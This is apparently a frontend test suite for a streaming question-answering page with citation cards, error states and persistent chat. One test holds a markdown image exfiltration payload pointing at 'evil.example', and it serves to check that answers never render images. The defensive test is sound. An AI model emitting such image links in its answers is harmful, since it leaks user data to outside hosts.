import { cleanup, render, screen, waitFor, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { createMemoryRouter, RouterProvider } from "react-router";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { NOT_FOUND_ANSWER } from "@/constants";
import { loginRedirect } from "@/lib/apiClient";
import { STOPPED_MESSAGE } from "@/lib/chatStorage";
import { getToken, setToken } from "@/lib/auth";
import { routes } from "@/routes";
import type { Citation } from "@/types/api";

const future = new Date(Date.now() + 60_000).toISOString();
const fetchMock = vi.fn<typeof fetch>();

function citation(n: number, overrides: Partial<Citation> = {}): Citation {
  return {
    n,
    itemId: `item-${n}`,
    type: "NOTE",
    title: `Note ${n}`,
    sourceUrl: null,
    snippet: `snippet ${n}`,
    similarity: 0.8,
    ...overrides,
  };
}

function sse(event: string, data: unknown) {
  return `event: ${event}\ndata: ${JSON.stringify(data)}\n\n`;
}

function streamResponse(chunks: string[], { close = true } = {}) {
  const encoder = new TextEncoder();
  const body = new ReadableStream<Uint8Array>({
    start(controller) {
      for (const chunk of chunks) controller.enqueue(encoder.encode(chunk));
      if (close) controller.close();
    },
  });
  return new Response(body, { status: 200, headers: { "Content-Type": "text/event-stream" } });
}

function renderAsk() {
  const router = createMemoryRouter(routes, { initialEntries: ["/"] });
  render(<RouterProvider router={router} />);
}

async function ask(question: string) {
  await userEvent.type(screen.getByRole("textbox", { name: "Question" }), `${question}{Enter}`);
}

beforeEach(() => {
  setToken("tok", future);
  vi.stubGlobal("fetch", fetchMock);
  vi.spyOn(loginRedirect, "go").mockImplementation(() => {});
});

afterEach(() => {
  localStorage.clear();
  fetchMock.mockReset();
  vi.unstubAllGlobals();
  vi.restoreAllMocks();
});

describe("AskPage", () => {
  it("starts with a centered question box", () => {
    renderAsk();
    expect(screen.getByRole("heading", { name: "What do you want to know?" })).toBeInTheDocument();
    expect(screen.getByRole("button", { name: "Ask" })).toBeDisabled();
  });

  it("posts the question with the token and streams citations and a markdown answer", async () => {
    fetchMock.mockResolvedValue(
      streamResponse([
        sse("citations", [
          citation(1),
          citation(2, { type: "URL", title: "Page", sourceUrl: "https://example.com/p" }),
        ]),
        sse("token", { text: "Cats **sleep** a lot [1" }),
        sse("token", { text: "]. Dogs bark [2]." }),
        sse("done", {}),
      ]),
    );
    renderAsk();
    await ask("  do cats sleep?  ");

    expect(await screen.findByRole("heading", { name: "do cats sleep?" })).toBeInTheDocument();
    const [url, init] = fetchMock.mock.calls[0] ?? [];
    expect(url).toBe("http://localhost:3000/query");
    expect(init?.method).toBe("POST");
    expect(JSON.parse(String(init?.body))).toEqual({ query: "do cats sleep?" });
    expect(new Headers(init?.headers).get("Authorization")).toBe("Bearer tok");

    const sources = screen.getByRole("region", { name: "Sources" });
    const cards = within(sources).getAllByRole("listitem");
    expect(cards).toHaveLength(2);
    expect(within(cards[0] as HTMLElement).getByText("Note 1")).toBeInTheDocument();
    expect(within(cards[0] as HTMLElement).getByText("snippet 1")).toBeInTheDocument();
    expect(within(cards[0] as HTMLElement).getByText("80% match")).toBeInTheDocument();
    expect(within(cards[1] as HTMLElement).getByRole("link")).toHaveAttribute(
      "href",
      "https://example.com/p",
    );

    const answer = await screen.findByTestId("answer");
    await waitFor(() => expect(answer).toHaveTextContent("Dogs bark"));
    expect(within(answer).getByText("sleep").tagName).toBe("STRONG");
    expect(within(answer).getByRole("button", { name: "Citation 1" })).toBeInTheDocument();
    expect(within(answer).getByRole("button", { name: "Citation 2" })).toBeInTheDocument();
    expect(screen.queryByRole("status")).not.toBeInTheDocument();
  });

  it("shows citation cards before any token arrives", async () => {
    fetchMock.mockResolvedValue(
      streamResponse([sse("citations", [citation(1)])], { close: false }),
    );
    renderAsk();
    await ask("q");
    expect(await screen.findByText("Note 1")).toBeInTheDocument();
    expect(screen.getByRole("status")).toHaveTextContent("Writing the answer...");
  });

  it("scrolls to and highlights the card when a citation chip is clicked", async () => {
    const scrollIntoView = vi.fn();
    Element.prototype.scrollIntoView = scrollIntoView;
    fetchMock.mockResolvedValue(
      streamResponse([
        sse("citations", [citation(1), citation(2)]),
        sse("token", { text: "Fact【2】." }),
        sse("done", {}),
      ]),
    );
    renderAsk();
    await ask("q");
    await userEvent.click(await screen.findByRole("button", { name: "Citation 2" }));

    const [card1, card2] = within(screen.getByRole("region", { name: "Sources" })).getAllByRole(
      "listitem",
    );
    expect(scrollIntoView.mock.contexts.at(-1)).toBe(card2);
    expect(card2?.querySelector("[data-active]")).not.toBeNull();
    expect(card1?.querySelector("[data-active]")).toBeNull();
  });

  it("shows the not-found answer as a muted message with no cards", async () => {
    fetchMock.mockResolvedValue(
      streamResponse([
        sse("citations", []),
        sse("token", { text: NOT_FOUND_ANSWER }),
        sse("done", {}),
      ]),
    );
    renderAsk();
    await ask("unknown");
    const message = await screen.findByText(NOT_FOUND_ANSWER);
    expect(message).toHaveClass("text-muted-foreground");
    expect(screen.queryByRole("region", { name: "Sources" })).not.toBeInTheDocument();
  });

  it("shows a searching state before the citations arrive", async () => {
    fetchMock.mockResolvedValue(streamResponse([], { close: false }));
    renderAsk();
    await ask("q");
    expect(await screen.findByRole("status")).toHaveTextContent("Searching your saved items...");
  });

  it("hides the sources when the LLM itself replies not found", async () => {
    fetchMock.mockResolvedValue(
      streamResponse([
        sse("citations", [citation(1)]),
        sse("token", { text: NOT_FOUND_ANSWER }),
        sse("done", {}),
      ]),
    );
    renderAsk();
    await ask("q");
    expect(await screen.findByText(NOT_FOUND_ANSWER)).toHaveClass("text-muted-foreground");
    expect(screen.queryByRole("region", { name: "Sources" })).not.toBeInTheDocument();
  });

  it("never renders images from the answer", async () => {
    fetchMock.mockResolvedValue(
      streamResponse([
        sse("citations", [citation(1)]),
        sse("token", { text: "Text ![x](https://evil.example/?d=secret) [1]" }),
        sse("done", {}),
      ]),
    );
    renderAsk();
    await ask("q");
    const answer = await screen.findByTestId("answer");
    await waitFor(() => expect(within(answer).getByRole("button", { name: "Citation 1" })));
    expect(answer.querySelector("img")).toBeNull();
  });

  it("does not turn [n] inside code into a chip", async () => {
    fetchMock.mockResolvedValue(
      streamResponse([
        sse("citations", [citation(1)]),
        sse("token", { text: "Use `arr[1]` here [1]." }),
        sse("done", {}),
      ]),
    );
    renderAsk();
    await ask("q");
    const answer = await screen.findByTestId("answer");
    await waitFor(() => expect(within(answer).getByText("arr[1]").tagName).toBe("CODE"));
    expect(within(answer).getAllByRole("button")).toHaveLength(1);
  });

  it("shows an invalid response message for bad event data", async () => {
    fetchMock.mockResolvedValue(streamResponse(["event: citations\ndata: {oops\n\n"]));
    renderAsk();
    await ask("q");
    expect(await screen.findByRole("alert")).toHaveTextContent("Invalid response from the server");
  });

  it("shows the stream error message and keeps the partial answer", async () => {
    fetchMock.mockResolvedValue(
      streamResponse([
        sse("citations", [citation(1)]),
        sse("token", { text: "Partial" }),
        sse("error", { message: "Could not answer the question. Try again." }),
      ]),
    );
    renderAsk();
    await ask("q");
    expect(await screen.findByRole("alert")).toHaveTextContent(
      "Could not answer the question. Try again.",
    );
    expect(screen.getByTestId("answer")).toHaveTextContent("Partial");
  });

  it("shows an error when the stream ends without done", async () => {
    fetchMock.mockResolvedValue(streamResponse([sse("citations", [])]));
    renderAsk();
    await ask("q");
    expect(await screen.findByRole("alert")).toHaveTextContent("The answer stopped early");
  });

  it("shows the 400 validation message", async () => {
    fetchMock.mockResolvedValue(
      new Response(
        JSON.stringify({ error: { code: "VALIDATION_ERROR", message: "Query is empty" } }),
        {
          status: 400,
        },
      ),
    );
    renderAsk();
    await ask("q");
    expect(await screen.findByRole("alert")).toHaveTextContent("Query is empty");
  });

  it("shows a network error", async () => {
    fetchMock.mockRejectedValue(new TypeError("Failed to fetch"));
    renderAsk();
    await ask("q");
    expect(await screen.findByRole("alert")).toHaveTextContent(
      "Could not reach the server. Try again.",
    );
  });

  it("goes to /login on a 401", async () => {
    fetchMock.mockResolvedValue(
      new Response(JSON.stringify({ error: { code: "UNAUTHORIZED", message: "Login required" } }), {
        status: 401,
      }),
    );
    renderAsk();
    await ask("q");
    await waitFor(() => expect(loginRedirect.go).toHaveBeenCalledOnce());
    expect(getToken()).toBeNull();
  });

  it("blocks a new question until the current answer finishes", async () => {
    let finish: () => void = () => undefined;
    const encoder = new TextEncoder();
    const body = new ReadableStream<Uint8Array>({
      start(controller) {
        controller.enqueue(encoder.encode(sse("citations", [])));
        finish = () => {
          controller.enqueue(encoder.encode(sse("token", { text: "A1" }) + sse("done", {})));
          controller.close();
        };
      },
    });
    fetchMock.mockResolvedValueOnce(new Response(body, { status: 200 }));
    renderAsk();
    await ask("first");
    await screen.findByRole("status");

    await ask("second");
    expect(screen.getByRole("button", { name: "Ask" })).toBeDisabled();
    expect(screen.getByRole("textbox", { name: "Question" })).toHaveValue("second");
    expect(fetchMock).toHaveBeenCalledOnce();
    expect(screen.getAllByRole("article")).toHaveLength(1);

    finish();
    expect(await screen.findByText("A1")).toBeInTheDocument();
    expect(screen.getByRole("button", { name: "Ask" })).toBeEnabled();
  });

  describe("auto scroll", () => {
    function setScroll(y: number, height: number) {
      Object.defineProperty(window, "scrollY", { value: y, configurable: true, writable: true });
      Object.defineProperty(document.documentElement, "scrollHeight", {
        value: height,
        configurable: true,
      });
      window.dispatchEvent(new Event("scroll"));
    }

    function controlledStream() {
      const encoder = new TextEncoder();
      let push: (text: string) => void = () => undefined;
      const body = new ReadableStream<Uint8Array>({
        start(controller) {
          push = (text) => controller.enqueue(encoder.encode(text));
        },
      });
      return { response: new Response(body, { status: 200 }), push: (t: string) => push(t) };
    }

    afterEach(() => {
      setScroll(0, 0);
      Reflect.deleteProperty(document.documentElement, "scrollHeight");
    });

    it("smoothly follows the answer to the bottom while it streams", async () => {
      const scrollTo = vi.spyOn(window, "scrollTo");
      const stream = controlledStream();
      fetchMock.mockResolvedValue(stream.response);
      renderAsk();
      await ask("q");
      stream.push(sse("citations", []));
      scrollTo.mockClear();

      stream.push(sse("token", { text: "more text" }));
      await screen.findByText("more text");
      await waitFor(() =>
        expect(scrollTo).toHaveBeenCalledWith({ top: expect.any(Number), behavior: "smooth" }),
      );
    });

    it("stops following when the user scrolls up, and follows again on the next question", async () => {
      const scrollTo = vi.spyOn(window, "scrollTo");
      const first = controlledStream();
      fetchMock.mockResolvedValueOnce(first.response);
      renderAsk();
      await ask("first");
      first.push(sse("citations", []) + sse("token", { text: "start" }));
      await screen.findByText("start");

      setScroll(4000, 5000);
      setScroll(1000, 5000);
      await new Promise((r) => requestAnimationFrame(r));
      scrollTo.mockClear();

      first.push(sse("token", { text: " middle" }));
      await screen.findByText("start middle");
      await new Promise((r) => requestAnimationFrame(r));
      expect(scrollTo).not.toHaveBeenCalled();

      first.push(sse("done", {}));
      await waitFor(() => expect(localStorage.getItem("chat")).toContain('"status":"done"'));
      const second = controlledStream();
      fetchMock.mockResolvedValueOnce(second.response);
      await ask("second");
      expect(fetchMock).toHaveBeenCalledTimes(2);
      await waitFor(() => expect(scrollTo).toHaveBeenCalled());
    });
  });

  it("disables the Library link while an answer is being generated", async () => {
    const encoder = new TextEncoder();
    let finish: () => void = () => undefined;
    const body = new ReadableStream<Uint8Array>({
      start(controller) {
        controller.enqueue(encoder.encode(sse("citations", [])));
        finish = () => {
          controller.enqueue(encoder.encode(sse("token", { text: "Done" }) + sse("done", {})));
          controller.close();
        };
      },
    });
    fetchMock.mockResolvedValueOnce(new Response(body, { status: 200 }));
    renderAsk();
    expect(screen.getByRole("link", { name: "Library" })).toHaveAttribute("href", "/library");

    await ask("q");
    await screen.findByRole("status");
    const blocked = screen.getByRole("link", { name: "Library" });
    expect(blocked).toHaveAttribute("aria-disabled", "true");
    expect(blocked).not.toHaveAttribute("href");
    await userEvent.click(blocked);
    expect(screen.getByRole("textbox", { name: "Question" })).toBeInTheDocument();

    finish();
    await screen.findByText("Done");
    await waitFor(() =>
      expect(screen.getByRole("link", { name: "Library" })).toHaveAttribute("href", "/library"),
    );
  });

  it("sends only the new question, never the earlier chat", async () => {
    fetchMock
      .mockResolvedValueOnce(
        streamResponse([sse("citations", []), sse("token", { text: "A1" }), sse("done", {})]),
      )
      .mockResolvedValueOnce(
        streamResponse([sse("citations", []), sse("token", { text: "A2" }), sse("done", {})]),
      );
    renderAsk();
    await ask("first");
    await screen.findByText("A1");
    await ask("second");
    await screen.findByText("A2");
    expect(JSON.parse(String(fetchMock.mock.calls[1]?.[1]?.body))).toEqual({ query: "second" });
  });

  it("shows the no-history warning before and after the first question", async () => {
    fetchMock.mockResolvedValue(
      streamResponse([sse("citations", []), sse("token", { text: "A" }), sse("done", {})]),
    );
    renderAsk();
    expect(screen.getByRole("note")).toHaveTextContent("Earlier messages are not sent to the AI");
    await ask("q");
    await screen.findByText("A");
    expect(screen.getByRole("note")).toHaveTextContent("Earlier messages are not sent to the AI");
  });

  it("keeps the chat in local storage across page loads", async () => {
    fetchMock.mockResolvedValue(
      streamResponse([
        sse("citations", [citation(1)]),
        sse("token", { text: "Saved answer [1]" }),
        sse("done", {}),
      ]),
    );
    renderAsk();
    await ask("remember me");
    await screen.findByRole("button", { name: "Citation 1" });
    cleanup();

    renderAsk();
    expect(screen.getByRole("heading", { name: "remember me" })).toBeInTheDocument();
    expect(screen.getByRole("button", { name: "Citation 1" })).toBeInTheDocument();
    expect(fetchMock).toHaveBeenCalledOnce();
  });

  it("shows a question left mid-stream as stopped after a reload", async () => {
    fetchMock.mockResolvedValue(streamResponse([sse("citations", [])], { close: false }));
    renderAsk();
    await ask("half done");
    await screen.findByRole("status");
    cleanup();

    renderAsk();
    expect(screen.getByRole("heading", { name: "half done" })).toBeInTheDocument();
    expect(screen.getByRole("alert")).toHaveTextContent(STOPPED_MESSAGE);
  });

  it("ignores broken chat data in local storage", () => {
    localStorage.setItem("chat", "{not json");
    renderAsk();
    expect(screen.getByRole("heading", { name: "What do you want to know?" })).toBeInTheDocument();
  });

  it("clears the chat after a confirm", async () => {
    fetchMock.mockResolvedValue(
      streamResponse([sse("citations", []), sse("token", { text: "A" }), sse("done", {})]),
    );
    renderAsk();
    await ask("q");
    await screen.findByText("A");

    vi.spyOn(window, "confirm").mockReturnValueOnce(false);
    await userEvent.click(screen.getByRole("button", { name: "Clear chat" }));
    expect(screen.getByText("A")).toBeInTheDocument();

    vi.spyOn(window, "confirm").mockReturnValueOnce(true);
    await userEvent.click(screen.getByRole("button", { name: "Clear chat" }));
    expect(screen.getByRole("heading", { name: "What do you want to know?" })).toBeInTheDocument();
    expect(localStorage.getItem("chat")).toBeNull();
  });

  it("does not send a question longer than 1000 chars", async () => {
    renderAsk();
    const box = screen.getByRole("textbox", { name: "Question" });
    expect(box).toHaveAttribute("maxLength", "1000");
  });
});
